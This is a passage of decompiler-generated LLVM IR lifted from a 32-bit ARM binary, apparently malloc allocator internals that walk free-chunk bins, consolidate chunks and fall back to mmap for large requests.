  %v2_1b954 = add i32 %v1_1b954, 12
  %v3_1b954 = inttoptr i32 %v2_1b954 to i32*
  store i32 %v0_1b954, i32* %v3_1b954, align 4
  %v0_1b958 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b958 = add i32 %v0_1b958, 8
  store i32 %v1_1b958, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_1b948, 15
  br i1 %tmp207, label %dec_label_pc_1b978, label %dec_label_pc_1b960

dec_label_pc_1b960:                               ; preds = %dec_label_pc_1b948
  %v1_1b960 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b960 = add i32 %v1_1b960, %v0_1b958
  store i32 %v2_1b960, i32* %r2.global-to-local, align 4
  %v1_1b964 = add i32 %v2_1b960, 4
  %v2_1b964 = inttoptr i32 %v1_1b964 to i32*
  %v3_1b964 = load i32, i32* %v2_1b964, align 4
  store i32 %v3_1b964, i32* %r3.global-to-local, align 4
  store i32 %v1_1b958, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1b96c.loopexit:                      ; preds = %dec_label_pc_1b80c
  %v1_1b818 = load i32, i32* @r6, align 4
  %v2_1b818 = load i32, i32* @sl, align 4
  %v3_1b818 = add i32 %v2_1b818, %v1_1b818
  store i32 %v3_1b818, i32* %r2.global-to-local, align 4
  %v2_1b81c = add i32 %v3_1b818, 4
  %v3_1b81c = inttoptr i32 %v2_1b81c to i32*
  %v4_1b81c = load i32, i32* %v3_1b81c, align 4
  store i32 %v4_1b81c, i32* %r3.global-to-local, align 4
  %v2_1b820 = add i32 %v1_1b818, 8
  store i32 %v2_1b820, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1b96c:                               ; preds = %.dec_label_pc_1b96c_crit_edge, %dec_label_pc_1b96c.loopexit, %dec_label_pc_1b960
  %v1_1b970 = phi i32 [ %v4_1ba94, %.dec_label_pc_1b96c_crit_edge ], [ %v3_1b818, %dec_label_pc_1b96c.loopexit ], [ %v2_1b960, %dec_label_pc_1b960 ]
  %v0_1b96c = phi i32 [ %v7_1ba94, %.dec_label_pc_1b96c_crit_edge ], [ %v4_1b81c, %dec_label_pc_1b96c.loopexit ], [ %v3_1b964, %dec_label_pc_1b960 ]
  %v1_1b96c = or i32 %v0_1b96c, 1
  store i32 %v1_1b96c, i32* %r3.global-to-local, align 4
  %v2_1b970 = add i32 %v1_1b970, 4
  %v3_1b970 = inttoptr i32 %v2_1b970 to i32*
  store i32 %v1_1b96c, i32* %v3_1b970, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1b978:                               ; preds = %dec_label_pc_1b948
  %v1_1b978 = load i32, i32* @sl, align 4
  %v2_1b978 = add i32 %v1_1b978, %v0_1b958
  store i32 %v2_1b978, i32* %r2.global-to-local, align 4
  %v1_1b97c = or i32 %v1_1b978, 1
  store i32 %v1_1b97c, i32* %r3.global-to-local, align 4
  %v0_1b980 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b980 = or i32 %v0_1b980, 1
  store i32 %v1_1b980, i32* %r1.global-to-local, align 4
  store i32 %v1_1b958, i32* %r4.global-to-local, align 4
  %v2_1b988 = add i32 %v0_1b958, 4
  %v3_1b988 = inttoptr i32 %v2_1b988 to i32*
  store i32 %v1_1b97c, i32* %v3_1b988, align 4
  %v0_1b98c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b98c = load i32, i32* @r6, align 4
  %v2_1b98c = add i32 %v1_1b98c, 8
  %v3_1b98c = inttoptr i32 %v2_1b98c to i32*
  store i32 %v0_1b98c, i32* %v3_1b98c, align 4
  %v0_1b990 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b990 = load i32, i32* @r6, align 4
  %v2_1b990 = add i32 %v1_1b990, 12
  %v3_1b990 = inttoptr i32 %v2_1b990 to i32*
  store i32 %v0_1b990, i32* %v3_1b990, align 4
  %v0_1b994 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b994 = load i32, i32* %r2.global-to-local, align 4
  %v3_1b994 = add i32 %v1_1b994, %v0_1b994
  %v4_1b994 = inttoptr i32 %v3_1b994 to i32*
  store i32 %v0_1b994, i32* %v4_1b994, align 4
  %v0_1b998 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b998 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b998 = add i32 %v1_1b998, 4
  %v3_1b998 = inttoptr i32 %v2_1b998 to i32*
  store i32 %v0_1b998, i32* %v3_1b998, align 4
  %v0_1b99c = load i32, i32* @r6, align 4
  %v1_1b99c = load i32, i32* %r2.global-to-local, align 4
  %v2_1b99c = add i32 %v1_1b99c, 12
  %v3_1b99c = inttoptr i32 %v2_1b99c to i32*
  store i32 %v0_1b99c, i32* %v3_1b99c, align 4
  %v0_1b9a0 = load i32, i32* @r6, align 4
  %v1_1b9a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b9a0 = add i32 %v1_1b9a0, 8
  %v3_1b9a0 = inttoptr i32 %v2_1b9a0 to i32*
  store i32 %v0_1b9a0, i32* %v3_1b9a0, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1b9ac:                               ; preds = %dec_label_pc_1b914, %dec_label_pc_1b904
  %v1_1b93c = phi i32 [ %storemerge.pre, %dec_label_pc_1b904 ], [ %v3_1b920, %dec_label_pc_1b914 ]
  store i32 %v1_1b93c, i32* %ip.global-to-local, align 4
  %v9_1b9ac = icmp eq i32 %v1_1b93c, %v1_1b908
  br i1 %v9_1b9ac, label %dec_label_pc_1b9b4.loopexit, label %dec_label_pc_1b914

dec_label_pc_1b9b4.loopexit:                      ; preds = %dec_label_pc_1b9ac
  br label %dec_label_pc_1b9b4

dec_label_pc_1b9b4:                               ; preds = %dec_label_pc_1b8fc.dec_label_pc_1b9b4_crit_edge, %dec_label_pc_1b9b4.loopexit
  %v4_1b9e4.pre-phi = phi i32 [ %.pre200, %dec_label_pc_1b8fc.dec_label_pc_1b9b4_crit_edge ], [ %v4_1b904, %dec_label_pc_1b9b4.loopexit ]
  %v1_1b9b4 = add i32 %v0_1b9b4.pre, 1
  store i32 %v1_1b9b4, i32* %r2.global-to-local, align 4
  %v1_1b9b8 = urem i32 %v1_1b9b4, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r0.global-to-local, align 4
  %v6_1b9c4 = shl i32 1, %v1_1b9b8
  store i32 %v6_1b9c4, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1b9cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1b9cc, i32* %r3.global-to-local, align 4
  %v3_1b9d0 = udiv i32 %v1_1b9b4, 32
  store i32 %v3_1b9d0, i32* @r5, align 4
  %v4_1b9d4 = mul nuw nsw i32 %v3_1b9d0, 4
  %v5_1b9d4 = add i32 %v4_1b9cc, %v4_1b9d4
  store i32 %v5_1b9d4, i32* %r2.global-to-local, align 4
  %v1_1b9d8 = add i32 %v5_1b9d4, 820
  %v2_1b9d8 = inttoptr i32 %v1_1b9d8 to i32*
  %v3_1b9d8 = load i32, i32* %v2_1b9d8, align 4
  store i32 %v3_1b9d8, i32* @r4, align 4
  %v1_1b9dc = add i32 %v4_1b9cc, 52
  store i32 %v1_1b9dc, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_1b9e4 = add i32 %v1_1b9dc, %v4_1b9e4.pre-phi
  store i32 %v5_1b9e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b9e8

dec_label_pc_1b9e8:                               ; preds = %dec_label_pc_1ba50, %dec_label_pc_1b9b4
  %v1_1b9f0 = phi i32 [ %v1_1b9f0.pre, %dec_label_pc_1ba50 ], [ %v3_1b9d8, %dec_label_pc_1b9b4 ]
  %v0_1b9f0 = phi i32 [ %v0_1b9e8.pre, %dec_label_pc_1ba50 ], [ %v6_1b9c4, %dec_label_pc_1b9b4 ]
  %v1_1b9e8 = sub i32 1, %v0_1b9f0
  %v2_1b9e8 = icmp ult i32 %v0_1b9f0, 2
  %v1_1b9e8. = select i1 %v2_1b9e8, i32 %v1_1b9e8, i32 0
  store i32 %v1_1b9e8., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_1b9f0, %v1_1b9f0
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_1b9e8
  %v5_1b9f4 = or i32 %v1_1b9e8., 1
  store i32 %v5_1b9f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ba00.preheader

bb142:                                            ; preds = %dec_label_pc_1b9e8
  %v2_1b9f8 = icmp eq i32 %v1_1b9e8., 0
  br i1 %v2_1b9f8, label %.dec_label_pc_1ba3c.preheader_crit_edge, label %dec_label_pc_1ba00.preheader

.dec_label_pc_1ba3c.preheader_crit_edge:          ; preds = %bb142
  %v0_1ba3454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ba3c.preheader

dec_label_pc_1ba00.preheader:                     ; preds = %bb142, %.thread12
  %v0_1ba00.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ba00

dec_label_pc_1ba00:                               ; preds = %dec_label_pc_1ba00.preheader, %dec_label_pc_1ba0c
  %v0_1ba00 = phi i32 [ %v0_1ba00.pre, %dec_label_pc_1ba00.preheader ], [ %v1_1ba00, %dec_label_pc_1ba0c ]
  %v1_1ba00 = add i32 %v0_1ba00, 1
  store i32 %v1_1ba00, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_1ba00, 2
  br i1 %tmp208, label %dec_label_pc_1bae0.loopexit, label %dec_label_pc_1ba0c

dec_label_pc_1ba0c:                               ; preds = %dec_label_pc_1ba00
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r3.global-to-local, align 4
  %v1_1ba10 = load i32, i32* @r8, align 4
  %v2_1ba10 = add i32 %v1_1ba10, ptrtoint (i32* @global_var_2c010.418 to i32)
  %v3_1ba10 = inttoptr i32 %v2_1ba10 to i32*
  %v4_1ba10 = load i32, i32* %v3_1ba10, align 4
  store i32 %v4_1ba10, i32* %r2.global-to-local, align 4
  %v4_1ba14 = mul i32 %v1_1ba00, 4
  %v5_1ba14 = add i32 %v4_1ba10, %v4_1ba14
  store i32 %v5_1ba14, i32* %r3.global-to-local, align 4
  %v1_1ba18 = add i32 %v5_1ba14, 820
  %v2_1ba18 = inttoptr i32 %v1_1ba18 to i32*
  %v3_1ba18 = load i32, i32* %v2_1ba18, align 4
  store i32 %v3_1ba18, i32* @r4, align 4
  %v2_1ba1c = icmp eq i32 %v3_1ba18, 0
  br i1 %v2_1ba1c, label %dec_label_pc_1ba00, label %dec_label_pc_1ba24

dec_label_pc_1ba24:                               ; preds = %dec_label_pc_1ba0c
  %v4_1ba24 = mul i32 %v1_1ba00, 256
  %v5_1ba24 = add i32 %v4_1ba10, %v4_1ba24
  store i32 %v5_1ba24, i32* %r3.global-to-local, align 4
  %v1_1ba28 = add i32 %v5_1ba24, 44
  store i32 %v1_1ba28, i32* %r0.global-to-local, align 4
  %v0_1ba2c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1ba2c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1ba3c.preheader

dec_label_pc_1ba3c.preheader:                     ; preds = %.dec_label_pc_1ba3c.preheader_crit_edge, %dec_label_pc_1ba24
  %v0_1ba3454 = phi i32 [ %v1_1ba28, %dec_label_pc_1ba24 ], [ %v0_1ba3454.pre, %.dec_label_pc_1ba3c.preheader_crit_edge ]
  %v0_1ba58 = phi i32 [ %v3_1ba18, %dec_label_pc_1ba24 ], [ %v1_1b9f0, %.dec_label_pc_1ba3c.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_1ba2c, %dec_label_pc_1ba24 ], [ %v0_1b9f0, %.dec_label_pc_1ba3c.preheader_crit_edge ]
  %v2_1ba3c51 = and i32 %ip.promoted, %v0_1ba58
  %v4_1ba3c53 = icmp eq i32 %v2_1ba3c51, 0
  br i1 %v4_1ba3c53, label %dec_label_pc_1ba34, label %dec_label_pc_1ba44

dec_label_pc_1ba34:                               ; preds = %dec_label_pc_1ba3c.preheader, %dec_label_pc_1ba34
  %v2_1ba3856 = phi i32 [ %v2_1ba38, %dec_label_pc_1ba34 ], [ %ip.promoted, %dec_label_pc_1ba3c.preheader ]
  %v0_1ba3455 = phi i32 [ %v1_1ba34, %dec_label_pc_1ba34 ], [ %v0_1ba3454, %dec_label_pc_1ba3c.preheader ]
  %v1_1ba34 = add i32 %v0_1ba3455, 8
  %v2_1ba38 = mul i32 %v2_1ba3856, 2
  %v2_1ba3c = and i32 %v2_1ba38, %v0_1ba58
  %v4_1ba3c = icmp eq i32 %v2_1ba3c, 0
  br i1 %v4_1ba3c, label %dec_label_pc_1ba34, label %dec_label_pc_1ba3c.dec_label_pc_1ba44_crit_edge

dec_label_pc_1ba3c.dec_label_pc_1ba44_crit_edge:  ; preds = %dec_label_pc_1ba34
  store i32 %v1_1ba34, i32* %r0.global-to-local, align 4
  store i32 %v2_1ba38, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1ba44

dec_label_pc_1ba44:                               ; preds = %dec_label_pc_1ba3c.dec_label_pc_1ba44_crit_edge, %dec_label_pc_1ba3c.preheader
  %v0_1ba64 = phi i32 [ %v2_1ba38, %dec_label_pc_1ba3c.dec_label_pc_1ba44_crit_edge ], [ %ip.promoted, %dec_label_pc_1ba3c.preheader ]
  %v0_1ba88 = phi i32 [ %v1_1ba34, %dec_label_pc_1ba3c.dec_label_pc_1ba44_crit_edge ], [ %v0_1ba3454, %dec_label_pc_1ba3c.preheader ]
  %v1_1ba44 = add i32 %v0_1ba88, 12
  %v2_1ba44 = inttoptr i32 %v1_1ba44 to i32*
  %v3_1ba44 = load i32, i32* %v2_1ba44, align 4
  store i32 %v3_1ba44, i32* @lr, align 4
  %v9_1ba48 = icmp eq i32 %v3_1ba44, %v0_1ba88
  br i1 %v9_1ba48, label %dec_label_pc_1ba50, label %dec_label_pc_1ba70

dec_label_pc_1ba50:                               ; preds = %dec_label_pc_1ba44
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r0.global-to-local, align 4
  %v1_1ba54 = load i32, i32* @r8, align 4
  %v2_1ba54 = add i32 %v1_1ba54, ptrtoint (i32* @global_var_2c010.418 to i32)
  %v3_1ba54 = inttoptr i32 %v2_1ba54 to i32*
  %v4_1ba54 = load i32, i32* %v3_1ba54, align 4
  %v2_1ba58 = sub i32 -1, %v0_1ba64
  %v3_1ba58 = and i32 %v0_1ba58, %v2_1ba58
  store i32 %v3_1ba58, i32* @r4, align 4
  %v1_1ba5c = load i32, i32* @r5, align 4
  %v4_1ba5c = mul i32 %v1_1ba5c, 4
  %v5_1ba5c = add i32 %v4_1ba5c, %v4_1ba54
  store i32 %v5_1ba5c, i32* %r3.global-to-local, align 4
  %v1_1ba60 = add i32 %v0_1ba88, 8
  store i32 %v1_1ba60, i32* %r0.global-to-local, align 4
  %v2_1ba64 = mul i32 %v0_1ba64, 2
  store i32 %v2_1ba64, i32* %ip.global-to-local, align 4
  %v2_1ba68 = add i32 %v5_1ba5c, 820
  %v3_1ba68 = inttoptr i32 %v2_1ba68 to i32*
  store i32 %v3_1ba58, i32* %v3_1ba68, align 4
  %v0_1b9e8.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_1b9f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b9e8

dec_label_pc_1ba70:                               ; preds = %dec_label_pc_1ba44
  %v1_1ba70 = add i32 %v3_1ba44, 4
  %v2_1ba70 = inttoptr i32 %v1_1ba70 to i32*
  %v3_1ba70 = load i32, i32* %v2_1ba70, align 4
  store i32 %v3_1ba70, i32* %r3.global-to-local, align 4
  %v1_1ba74 = and i32 %v3_1ba70, -4
  store i32 %v1_1ba74, i32* %r2.global-to-local, align 4
  %v0_1ba78 = load i32, i32* @sl, align 4
  %v2_1ba78 = sub i32 %v1_1ba74, %v0_1ba78
  store i32 %v2_1ba78, i32* %ip.global-to-local, align 4
  %v1_1ba7c = add i32 %v3_1ba44, 12
  %v2_1ba7c = inttoptr i32 %v1_1ba7c to i32*
  %v3_1ba7c = load i32, i32* %v2_1ba7c, align 4
  store i32 %v3_1ba7c, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_1ba78, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_1ba70
  %v6_1ba84 = add i32 %v1_1ba74, %v3_1ba44
  store i32 %v6_1ba84, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_1ba70, %bb143
  %v2_1ba88 = add i32 %v3_1ba7c, 8
  %v3_1ba88 = inttoptr i32 %v2_1ba88 to i32*
  store i32 %v0_1ba88, i32* %v3_1ba88, align 4
  %v0_1ba8c = load i32, i32* %r3.global-to-local, align 4
  %v1_1ba8c = load i32, i32* %r0.global-to-local, align 4
  %v2_1ba8c = add i32 %v1_1ba8c, 12
  %v3_1ba8c = inttoptr i32 %v2_1ba8c to i32*
  store i32 %v0_1ba8c, i32* %v3_1ba8c, align 4
  %v4_1ba90 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_1b96c_crit_edge, label %dec_label_pc_1ba9c

.dec_label_pc_1b96c_crit_edge:                    ; preds = %bb144
  %v5_1ba90 = add i32 %v4_1ba90, 8
  store i32 %v5_1ba90, i32* %r4.global-to-local, align 4
  %v4_1ba94 = load i32, i32* %r2.global-to-local, align 4
  %v5_1ba94 = add i32 %v4_1ba94, 4
  %v6_1ba94 = inttoptr i32 %v5_1ba94 to i32*
  %v7_1ba94 = load i32, i32* %v6_1ba94, align 4
  store i32 %v7_1ba94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1ba9c:                               ; preds = %bb144
  %v1_1ba9c = load i32, i32* @sl, align 4
  %v2_1ba9c = add i32 %v1_1ba9c, %v4_1ba90
  store i32 %v2_1ba9c, i32* %r1.global-to-local, align 4
  %v1_1baa4 = load i32, i32* @r6, align 4
  %v2_1baa4 = add i32 %v1_1baa4, 8
  %v3_1baa4 = inttoptr i32 %v2_1baa4 to i32*
  store i32 %v2_1ba9c, i32* %v3_1baa4, align 4
  %v0_1baa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1baa8 = load i32, i32* @r6, align 4
  %v2_1baa8 = add i32 %v1_1baa8, 12
  %v3_1baa8 = inttoptr i32 %v2_1baa8 to i32*
  store i32 %v0_1baa8, i32* %v3_1baa8, align 4
  %v0_1baac = load i32, i32* @r6, align 4
  %v1_1baac = load i32, i32* %r1.global-to-local, align 4
  %v2_1baac = add i32 %v1_1baac, 8
  %v3_1baac = inttoptr i32 %v2_1baac to i32*
  store i32 %v0_1baac, i32* %v3_1baac, align 4
  %v0_1bab0 = load i32, i32* @r6, align 4
  %v1_1bab0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1bab0 = add i32 %v1_1bab0, 12
  %v3_1bab0 = inttoptr i32 %v2_1bab0 to i32*
  store i32 %v0_1bab0, i32* %v3_1bab0, align 4
  %tmp210 = icmp ult i32 %v1_1ba9c, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_1ba9c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r2.global-to-local, align 4
  %v8_1babc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v8_1babc, i32* %r3.global-to-local, align 4
  %v4_1bac0 = load i32, i32* %r1.global-to-local, align 4
  %v6_1bac0 = add i32 %v8_1babc, 48
  %v7_1bac0 = inttoptr i32 %v6_1bac0 to i32*
  store i32 %v4_1bac0, i32* %v7_1bac0, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_1ba9c, %bb145
  %v0_1bac4 = load i32, i32* @sl, align 4
  %v1_1bac4 = or i32 %v0_1bac4, 1
  store i32 %v1_1bac4, i32* %r2.global-to-local, align 4
  %v0_1bac8 = load i32, i32* %ip.global-to-local, align 4
  %v1_1bac8 = or i32 %v0_1bac8, 1
  store i32 %v1_1bac8, i32* %r3.global-to-local, align 4
  %v0_1bacc = load i32, i32* @lr, align 4
  %v1_1bacc = add i32 %v0_1bacc, 8
  store i32 %v1_1bacc, i32* %r4.global-to-local, align 4
  %v2_1bad0 = add i32 %v0_1bacc, 4
  %v3_1bad0 = inttoptr i32 %v2_1bad0 to i32*
  store i32 %v1_1bac4, i32* %v3_1bad0, align 4
  %v0_1bad4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1bad4 = load i32, i32* %r1.global-to-local, align 4
  %v3_1bad4 = add i32 %v1_1bad4, %v0_1bad4
  %v4_1bad4 = inttoptr i32 %v3_1bad4 to i32*
  store i32 %v0_1bad4, i32* %v4_1bad4, align 4
  %v0_1bad8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bad8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1bad8 = add i32 %v1_1bad8, 4
  %v3_1bad8 = inttoptr i32 %v2_1bad8 to i32*
  store i32 %v0_1bad8, i32* %v3_1bad8, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1bae0.loopexit:                      ; preds = %dec_label_pc_1ba00
  br label %dec_label_pc_1bae0

dec_label_pc_1bae0:                               ; preds = %dec_label_pc_1bae0.loopexit, %dec_label_pc_1b6f4, %dec_label_pc_1b6fc
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %ip.global-to-local, align 4
  %v4_1bae8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1bae8, i32* @r0, align 4
  %v1_1baec = add i32 %v4_1bae8, 44
  %v2_1baec = inttoptr i32 %v1_1baec to i32*
  %v3_1baec = load i32, i32* %v2_1baec, align 4
  store i32 %v3_1baec, i32* %ip.global-to-local, align 4
  %v1_1baf0 = add i32 %v3_1baec, 4
  %v2_1baf0 = inttoptr i32 %v1_1baf0 to i32*
  %v3_1baf0 = load i32, i32* %v2_1baf0, align 4
  %v0_1baf4 = load i32, i32* @sl, align 4
  %v1_1baf4 = add i32 %v0_1baf4, 16
  store i32 %v1_1baf4, i32* %r1.global-to-local, align 4
  %v1_1baf8 = and i32 %v3_1baf0, -4
  store i32 %v1_1baf8, i32* %r3.global-to-local, align 4
  %v3_1bafc = icmp ult i32 %v1_1baf8, %v1_1baf4
  br i1 %v3_1bafc, label %dec_label_pc_1bb2c, label %dec_label_pc_1bb08

dec_label_pc_1bb08:                               ; preds = %dec_label_pc_1bae0
  %v2_1bb08 = sub i32 %v1_1baf8, %v0_1baf4
  %v2_1bb0c = add i32 %v0_1baf4, %v3_1baec
  store i32 %v2_1bb0c, i32* %r1.global-to-local, align 4
  %v1_1bb10 = or i32 %v2_1bb08, 1
  store i32 %v1_1bb10, i32* %r3.global-to-local, align 4
  %v1_1bb14 = or i32 %v0_1baf4, 1
  store i32 %v1_1bb14, i32* %r2.global-to-local, align 4
  %v1_1bb18 = add i32 %v3_1baec, 8
  store i32 %v1_1bb18, i32* %r4.global-to-local, align 4
  store i32 %v1_1bb14, i32* %v2_1baf0, align 4
  %v0_1bb20 = load i32, i32* %r1.global-to-local, align 4
  %v1_1bb20 = load i32, i32* @r0, align 4
  %v2_1bb20 = add i32 %v1_1bb20, 44
  %v3_1bb20 = inttoptr i32 %v2_1bb20 to i32*
  store i32 %v0_1bb20, i32* %v3_1bb20, align 4
  %v0_1bb24 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bb24 = load i32, i32* %r1.global-to-local, align 4
  %v2_1bb24 = add i32 %v1_1bb24, 4
  %v3_1bb24 = inttoptr i32 %v2_1bb24 to i32*
  store i32 %v0_1bb24, i32* %v3_1bb24, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1bb2c:                               ; preds = %dec_label_pc_1bae0
  %v1_1bb2c = inttoptr i32 %v4_1bae8 to i32*
  %v2_1bb2c = load i32, i32* %v1_1bb2c, align 4
  store i32 %v2_1bb2c, i32* %r3.global-to-local, align 4
  %v1_1bb30 = and i32 %v2_1bb2c, 2
  store i32 %v1_1bb30, i32* %ip.global-to-local, align 4
  %v2_1bb30 = icmp eq i32 %v1_1bb30, 0
  %v1_1bb34 = add i32 %v4_1bae8, 860
  %v2_1bb34 = inttoptr i32 %v1_1bb34 to i32*
  %v3_1bb34 = load i32, i32* %v2_1bb34, align 4
  store i32 %v3_1bb34, i32* %r1.global-to-local, align 4
  br i1 %v2_1bb30, label %dec_label_pc_1bb4c, label %dec_label_pc_1bb3c

dec_label_pc_1bb3c:                               ; preds = %dec_label_pc_1bb2c
  %v0_1bb3c = call i32 @__malloc_consolidate()
  %v0_1bb40 = load i32, i32* @sl, align 4
  %v1_1bb40 = add i32 %v0_1bb40, -7
  store i32 %v1_1bb40, i32* %r0.global-to-local, align 4
  %v1_1bb44 = call i32 @malloc(i32 %v1_1bb40)
  store i32 %v1_1bb44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bf30

dec_label_pc_1bb4c:                               ; preds = %dec_label_pc_1bb2c
  %v1_1bb4c = add i32 %v4_1bae8, 844
  %v2_1bb4c = inttoptr i32 %v1_1bb4c to i32*
  %v3_1bb4c = load i32, i32* %v2_1bb4c, align 4
  store i32 %v3_1bb4c, i32* %r3.global-to-local, align 4
  %v3_1bb50 = icmp ult i32 %v0_1baf4, %v3_1bb4c
  %v1_1bb54 = add i32 %v3_1bb34, -1
  store i32 %v1_1bb54, i32* %sb.global-to-local, align 4
  br i1 %v3_1bb50, label %dec_label_pc_1bc28, label %dec_label_pc_1bb5c

dec_label_pc_1bb5c:                               ; preds = %dec_label_pc_1bb4c
  %v1_1bb5c = add i32 %v4_1bae8, 852
  %v2_1bb5c = inttoptr i32 %v1_1bb5c to i32*
  %v3_1bb5c = load i32, i32* %v2_1bb5c, align 4
  store i32 %v3_1bb5c, i32* %r2.global-to-local, align 4
  %v1_1bb60 = add i32 %v4_1bae8, 848
  %v2_1bb60 = inttoptr i32 %v1_1bb60 to i32*
  %v3_1bb60 = load i32, i32* %v2_1bb60, align 4
  store i32 %v3_1bb60, i32* %r3.global-to-local, align 4
  %v6_1bb68 = icmp slt i32 %v3_1bb60, %v3_1bb5c
  br i1 %v6_1bb68, label %dec_label_pc_1bb6c, label %dec_label_pc_1bc28

dec_label_pc_1bb6c:                               ; preds = %dec_label_pc_1bb5c
  %v1_1bb6c = add i32 %v0_1baf4, 10
  %v2_1bb70 = add i32 %v1_1bb6c, %v3_1bb34
  store i32 %v2_1bb70, i32* %r3.global-to-local, align 4
  %v2_1bb74 = sub i32 0, %v3_1bb34
  %v3_1bb74 = and i32 %v2_1bb70, %v2_1bb74
  store i32 %v3_1bb74, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_1bb74, %v0_1baf4
  br i1 %tmp211, label %dec_label_pc_1bb80, label %dec_label_pc_1bc28

dec_label_pc_1bb80:                               ; preds = %dec_label_pc_1bb6c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_1bb74, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1bb98 = call i32 @mmap(i32 0, i32 %v3_1bb74, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1bb98, i32* %r0.global-to-local, align 4
  %v7_1bb9c = icmp eq i32 %v6_1bb98, -1
  br i1 %v7_1bb9c, label %dec_label_pc_1bb80.dec_label_pc_1bc28_crit_edge, label %dec_label_pc_1bba4

dec_label_pc_1bb80.dec_label_pc_1bc28_crit_edge:  ; preds = %dec_label_pc_1bb80
  %v1_1bc4c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1bc28

dec_label_pc_1bba4:                               ; preds = %dec_label_pc_1bb80
  %v1_1bba4 = urem i32 %v6_1bb98, 8
  store i32 %v1_1bba4, i32* %r2.global-to-local, align 4
  %v2_1bba4 = icmp eq i32 %v1_1bba4, 0
  br i1 %v2_1bba4, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_1bba4
  %v2_1bba8 = sub nsw i32 8, %v1_1bba4
  store i32 %v2_1bba8, i32* %r3.global-to-local, align 4
  %v2_1bbac = load i32, i32* @r4, align 4
  %v3_1bbac = sub i32 %v2_1bbac, %v2_1bba8
  %v3_1bbb0 = add i32 %v2_1bba8, %v6_1bb98
  store i32 %v3_1bbb0, i32* %lr.global-to-local, align 4
  %v2_1bbb8 = or i32 %v3_1bbac, 2
  store i32 %v2_1bbb8, i32* %r2.global-to-local, align 4
  %v5_1bbc0 = inttoptr i32 %v3_1bbb0 to i32*
  store i32 %v2_1bba8, i32* %v5_1bbc0, align 4
  %v1_1bbc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1bbc4 = load i32, i32* %lr.global-to-local, align 4
  %v3_1bbc4 = add i32 %v2_1bbc4, 4
  %v4_1bbc4 = inttoptr i32 %v3_1bbc4 to i32*
  store i32 %v1_1bbc4, i32* %v4_1bbc4, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_1bba4
  store i32 %v6_1bb98, i32* %lr.global-to-local, align 4
  %v1_1bbbc47 = load i32, i32* @r4, align 4
  %v2_1bbbc48 = or i32 %v1_1bbbc47, 2
  store i32 %v2_1bbbc48, i32* %r3.global-to-local, align 4
